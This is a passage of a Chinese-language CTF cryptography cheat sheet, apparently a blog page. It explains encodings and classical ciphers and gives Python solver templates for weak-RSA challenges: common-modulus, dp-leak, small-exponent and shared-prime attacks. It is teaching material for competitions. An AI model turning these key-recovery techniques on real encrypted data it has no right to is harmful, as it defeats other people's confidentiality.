class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">cipher=<span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">dict</span>[j]==cipher[i]):</span><br><span class="line">            res+=base64_list[j]</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></blockquote></blockquote><blockquote><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>组成：由%加数字、字母组成。</p><p>RFC3986 协议规定 URL 只允许包含以下四种字符：<br>1、英文字母（a-zA-Z）<br>2、数字（0-9）<br>3、-_.~ 4个特殊字符<br>4、所有保留字符，RFC3986 中指定了以下字符为保留字符（英文字符）： ! * ‘ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>eg:%7B(“{“),%7D(“}”),%66%6c%61%67**%7b**%61%6e%64%20%31%3d%31**%7d** </p></blockquote><blockquote><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><blockquote><h3 id="凯撒"><a href="#凯撒" class="headerlink" title="凯撒"></a>凯撒</h3><p>组成：解码要知道<strong>偏移量</strong>，一定含有字母 </p><p>若试不出偏移量，可尝试quipqiup</p><p>eg:synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</p></blockquote><blockquote><h3 id="摩斯电码"><a href="#摩斯电码" class="headerlink" title="摩斯电码"></a>摩斯电码</h3><p>组成：解码需要知道<strong>分隔、长、短</strong>（常为空格、-、 .），密文由两种符号和分隔组成</p><p>eg:..-. .-.. .- –. —-.–(flag{)</p></blockquote><blockquote><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p><p>组成:栏数(可点击网址枚举解密),由明文字符打乱顺序组成</p></blockquote></blockquote><blockquote><h2 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h2><p>Quoted-printable可译为“可打印字符引用编码”，编码常用在电子邮件中，如：Content-Tra […]</p><p>组成:密文由&#x3D;加 字母或数学 加 字母或者数字</p><p>任何一个8位的字节值可编码为3个字符：一个等号”&#x3D;”后跟随两个十六进制数字(0–9或A–F)表示该字节的数值</p><p>eg:&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6</p></blockquote><blockquote><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><p>Rabbit加密是什么 Rabbit 是一种高速流密码，于 2003 年在 FSE 研讨会上首次提出。 Rabbit 使用一个 128 位密钥和一个 64 位初始化向量。 该加密算法的核心组件是一个位流生成器，该流生成器每次迭代都会加密 128 个消息位。</p><p>组成:字母,&#x3D;,+,&#x2F;     以U2FsdGVkX1开头;可能以&#x3D;结尾</p><p>eg:U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI </p></blockquote><blockquote><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><img src="https://blue-blue-blue-blue.github.io/img/b16.png" width ="60%"><p>n&#x3D;p * q;    m&#x3D;pow（c,d,n);         I &#x3D; gmpy2.invert(q,p);        mp &#x3D; pow(c,dp,p);           mq &#x3D; pow(c,dq,q) ;           m &#x3D; (((mp-mq)* I)%p)*q+mq</p><p>组成：数字，p、q为素数</p><p>已知p,q,e或者e,r,d:使用RSA-Tool 2 by tE!（number Base调为10，e的数据要转为16进制再输入，输入p、q(或输入r、d，点击Factor N)，点击Calc.D，取D即可）</p><p>已知c,d,n,则m（明文）&#x3D;pow（c,d,n）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = xxxxx</span><br><span class="line">q = xxxx</span><br><span class="line"></span><br><span class="line">e = xxx</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">c = xxxx</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)  <span class="comment"># 10进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])  <span class="comment"># 16进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))  <span class="comment"># 16进制转文本</span></span><br></pre></td></tr></table></figure><p>已知p、q、dp、dq、c则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">dp = </span><br><span class="line">dq = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c,dq,q)               <span class="comment">#求幂取模运算</span></span><br><span class="line"></span><br><span class="line">m = (((mp-mq)*I)%p)*q+mq       <span class="comment">#求明文公式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))          <span class="comment">#转为十六进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>已知n,c1,c2,e1,e2则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="comment"># 欧几里得算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="comment"># 求模反元素</span></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>已知e,n,dp,c</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">dp = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):  <span class="comment"># 在范围(1,e)之间进行遍历</span></span><br><span class="line"><span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:  <span class="comment"># 存在p，使得n能被p整除</span></span><br><span class="line">p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># 欧拉定理</span></span><br><span class="line">d = gp.invert(e, phi)  <span class="comment"># 求模逆</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># 快速求幂取模运算</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)  <span class="comment"># 10进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])  <span class="comment"># 16进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))  <span class="comment"># 16进制转文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#import libnum</span></span><br><span class="line"><span class="comment">#………………………………</span></span><br><span class="line"><span class="comment">#m = pow(c,d,n)</span></span><br><span class="line"><span class="comment">#print(libnum.n2s(m))  #（n2s将数值转化为字符串）</span></span><br></pre></td></tr></table></figure><p>公钥加签，已知除题目外还有一个文件，（如文件内容：A柪YJ^ 柛x秥?y[蔜?旭?緃沚）,将文件后缀改为txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line">e=                                        <span class="comment">#不用转16进制，用题目给的10进制就可</span></span><br><span class="line">n= </span><br><span class="line">p= </span><br><span class="line">q= </span><br><span class="line">d= </span><br><span class="line">key = rsa.PrivateKey(n,e,d,q,p)         <span class="comment">#在pkcs标准中,pkcs#1规定,私钥包含(n,e,d,p,q)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\v587\Desktop\\flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f: <span class="comment">#以二进制读模式,读取密文,复制文件地址时要将‘/’换为‘//’</span></span><br><span class="line">f = f.read()</span><br><span class="line"><span class="built_in">print</span>(rsa.decrypt(f,key))           <span class="comment"># f:公钥加密结果  key:私钥</span></span><br></pre></td></tr></table></figure><p>多行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N,p,q,e=xxx,xxx,xxx,xx</span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">result=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xxxxxxxxxx&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">line=line.strip(<span class="string">&#x27;\n&#x27;</span>)<span class="comment">#去掉列表中每一个元素的换行符</span></span><br><span class="line">result.append(<span class="built_in">chr</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(line),d,N)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line"><span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>低加密指数攻击 e很小 n很大又不好分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = xxxxxxxxx</span><br><span class="line">e= xxxx                      <span class="comment">#通常是三</span></span><br><span class="line">c = xxxxxxxx</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">res=iroot(c+k*n,e)</span><br><span class="line"><span class="keyword">if</span>(res[<span class="number">1</span>]==<span class="literal">True</span>):</span><br><span class="line">  <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(res[<span class="number">0</span>])))</span><br><span class="line">  <span class="keyword">break</span></span><br><span class="line">k=k+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>已知n,e，且e很大，求hashlib.md5(hex(d)).hexdigest()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">N = xxxxxxxxxxx</span><br><span class="line">e = xxxxxx</span><br><span class="line">p=xxxxxxxxxxx</span><br><span class="line">q=xxxxxx</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="string">b&#x27;****************&#x27;</span>).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#python3的结果hex(d)=***********,较python2可能有差别，故倒数第二步***********应为python2的hex(d)</span></span><br></pre></td></tr></table></figure><p>已知e,多组n,c,先求出q(n的最大公约数)，再求其他</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n0 = xxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c0 = xxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">n1 = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c1 = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">n2 = xxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c2 = xxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"><span class="comment">#..........</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=[n0,n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19]</span><br><span class="line">c=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span>(i!=j):</span><br><span class="line">            <span class="keyword">if</span>(gcd(n[i],n[j])!=<span class="number">1</span>):   <span class="comment">#对不同的n进行欧几里得算法，以求出最大公约数</span></span><br><span class="line">                <span class="built_in">print</span>(i,j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,gcd(n[i],n[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n4 = xxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c4 = xxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">p = mpz(xxxxxxxxxxxxx)<span class="comment">#xxxxxxxxx为运行上一段代码所求得的p</span></span><br><span class="line"></span><br><span class="line">q = n4//p        <span class="comment">#“//”  整除</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = xxxxxxxx</span><br><span class="line">d = invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c4,d,n4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)    <span class="comment"># &quot;n2s&quot; (数值转字符串)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure></blockquote><blockquote><h2 id="ntlm"><a href="#ntlm" class="headerlink" title="ntlm"></a>ntlm</h2><p>NT LAN Manager（NTLM）哈希是 Windows 系统认可的另一种算法，用于替代古老的 LM-Hash</p><p>组成：数字和字母，与Windows相关（Administrator:xxxxxx）</p><p>NTLM Hash 生成原理：</p><ol><li>先将用户密码转换为十六进制格式。</li><li>将十六进制格式的密码进行 Unicode 编码。</li><li>使用 MD4 摘要算法对 Unicode 编码数据进行 Hash 计算</li></ol></blockquote><blockquote><h2 id="中文电码"><a href="#中文电码" class="headerlink" title="中文电码"></a>中文电码</h2><p>中文电码表采用了四位阿拉伯数字作代号，简称“四码电报”，从0001到9999按四位数顺序排列</p><p>组成：4的倍数个数字</p></blockquote><blockquote><h2 id="quipqiup"><a href="#quipqiup" class="headerlink" title="quipqiup"></a>quipqiup</h2><p>quipqiup是Edwin Olson的快速自动密码求解器。它可以解决报纸上经常出现的简单替代密码，包括诸如密码窃听器（保留单词边界）之类的难题和爱国主义者（如密码迷）之类的难题。</p><p>组成：字符串，已知部分密文对应的明文或感觉简单处理（如调换字符顺序,偏移量规律变化）可得到东西</p></blockquote><blockquote><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><p>亦称朱高密码、共济会暗号、共济会密码或共济会员密码，是一种以格子为基础的简单替代式密码。</p><img src="https://blue-blue-blue-blue.github.io/img/zhujuan.png" width ="60%"> </blockquote><blockquote><h2 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h2><p>是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。</p><p>组成：字母，数字，特殊符号（&lt;  .  $  ]  ,  #）</p><p>eg:89FQA9WMD&lt;V1A&lt;V1S83DY.#&lt;W3$Q,2TM]</p></blockquote><blockquote><h2 id="Playfair（普莱费尔）"><a href="#Playfair（普莱费尔）" class="headerlink" title="Playfair（普莱费尔）"></a>Playfair（普莱费尔）</h2><p>1）Playfair密码是一种有向图替换密码。它使用一个字母表进行加密解密，其中省略了一个字母（通常将J从字母表中删除），并且这些字母以5x5网格排列，形成原始密码表。<br>2）录入Playfair加密密钥，去掉密钥中的相同字符（将后出现的相同字符删除），同时将J替换为I，将余下的密钥按5x5网络进行排列，对未出现的字母也按顺序进行排列，形成密码表。<br>3）录入待加密明文、待解密密文即可快速进行加密解密转换。</p></blockquote><blockquote><h2 id="ROT"><a href="#ROT" class="headerlink" title="ROT"></a>ROT</h2><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。<br>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号 _ 。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码。<br>eg:(rot47)   v)*L*_F0}@H0F49023@FE0#@EN</p></blockquote><blockquote><h2 id="Brainfuckp-一种编程语言"><a href="#Brainfuckp-一种编程语言" class="headerlink" title="Brainfuckp(一种编程语言)"></a>Brainfuckp(一种编程语言)</h2><p>组成：———-[———————-.,———-]    条件指令</p><p>,&gt;++++++[&lt;——–&gt;-],,[&lt;+&gt;-],&lt;.&gt;.     